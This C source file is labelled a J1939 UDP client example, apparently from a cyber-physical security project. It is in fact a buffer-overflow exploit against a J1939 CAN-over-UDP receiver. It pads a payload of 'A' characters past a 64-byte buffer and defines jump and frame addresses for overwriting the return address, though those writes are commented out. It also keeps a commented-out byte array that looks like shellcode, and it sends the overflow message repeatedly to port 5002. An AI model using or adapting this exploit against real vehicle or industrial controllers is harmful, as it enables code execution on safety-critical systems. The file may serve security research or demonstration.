/*
 * J1939 UDP Client Example Program
 *
 * author: Ethan Lew <elew@galois.com>
 *
 * Send a message over UDP using the CAN J1939 BAM protocol
 */

#include "cyberphys/j1939.h"
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 5002
#define PGN 60879
#define TARGET_ADDR "127.0.0.1"
#define OLD_JUMP_ADDR 0xc0986f00
#define JUMP_ADDR 0x826f3d98
#define FRAME_ADDR 0xc0229f50
#define BUFFER_SIZE 500
#define OG_BUFFER_SIZE 64
#define OVERFLOW_PACKET_FRAME_IDX BUFFER_SIZE+8 // 64+8
#define OVERFLOW_PACKET_ADDR_IDX BUFFER_SIZE+16 // 64+16
#define OVERFLOW_PACKET_SIZE BUFFER_SIZE+16+8 // 64+16+8

int main(int argc, char *argv[])
{
    /* setup the socket to broadcast */
    int sockfd, broadcast;
    struct sockaddr_in servaddr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    broadcast = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast,
                   sizeof(broadcast)) < 0)
    {
        perror("socket configuration failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    inet_pton(AF_INET, TARGET_ADDR, &servaddr.sin_addr.s_addr);

    printf("servaddr.sin_addr.s_addr: %u\r\n", servaddr.sin_addr.s_addr);

    char chr;
    uint8_t res;

    /* Send a dummy test message first */
    
    // const char msg[] = "This is a message from J1939 client: Hello World";
    // printf("Sending dummy message, %u bytes long.\n",sizeof(msg));
    // res = send_can_message(sockfd, &servaddr, PGN, (void *)&msg, sizeof(msg));
    // printf("response: %u\n", res);

    /* Send the payload */
    char payload[OVERFLOW_PACKET_SIZE];
    char * padd = "A";
    for(int i=0; i < sizeof(payload)-1; ++i){
        memcpy(payload + i, padd, sizeof(char));
    }
    
    //char payload[] = {0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0xe,0xf7,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0x2e,0xf8,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0xb7,0x0,0xc,0x0,0x9b,0x80,0x70,0x1,0x93,0x90,0xc0,0x0,0x93,0x80,0x40,0xdc,0x67,0x80,0x0,0x0,};
    printf("Payload len: %u\r\n",sizeof(payload));

    /* Send the buffer overflow message */
    char buffer[OVERFLOW_PACKET_SIZE+1];
    //memset(buffer, 0xb4, sizeof(buffer));
    memcpy(buffer, payload, sizeof(payload));
    /* 64 bytes of regular buffer + 32 bytes after + 8 bytes for the address */
    uint64_t addr = JUMP_ADDR;
    //memcpy(&buffer[OVERFLOW_PACKET_ADDR_IDX], &addr, sizeof(addr));
    addr = FRAME_ADDR;
    //memcpy(&buffer[OVERFLOW_PACKET_FRAME_IDX], &addr, sizeof(addr));
    //size_t len = OVERFLOW_PACKET_SIZE;
    size_t len = sizeof(buffer);
    //sleep(90);
    for(int j=0; j < 40; j++){
        res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, len);
        printf("send message\n");
        sleep(1);
    }
    // for(int j = 0; j < 200; j++){
    //   for(int i=0; i < 40; i++){
    //     printf("Sending jump, %u bytes long\n", len);
    //     buffer[sizeof(buffer)-1] = '\0';
    //     printf("send:%s\n",buffer);
    //     res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, len);
    //     printf("response: %u\n", res);
    //     sleep(0.5);
    //   }
    //   sleep(7);
    // }
    /* close and free */
    close(sockfd);

    printf("Done\n");
    return 0;
}
